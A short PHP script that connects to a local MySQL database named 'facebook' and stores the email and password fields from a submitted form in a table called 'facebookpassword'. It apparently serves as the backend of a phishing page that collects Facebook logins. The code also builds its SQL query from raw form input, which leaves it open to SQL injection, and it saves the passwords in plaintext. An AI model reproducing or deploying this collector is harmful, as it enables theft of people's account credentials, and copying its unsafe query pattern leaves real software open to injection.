<?php
$host="localhost";
$user="root";
$pass="";
$dbname="facebook";
$conn=mysqli_connect($host,$user,$pass,$dbname);
if($conn)
{
	echo "successfully";
}
else{
	echo"error db";
}
?>
<?php
if(isset($_POST['submit'])) {    
$namee = $_POST['email'];
$code = $_POST['pass'];

$query="INSERT INTO facebookpassword(name,password) VALUES('$namee','$code')";
$data=mysqli_query($conn,$query);
}

?>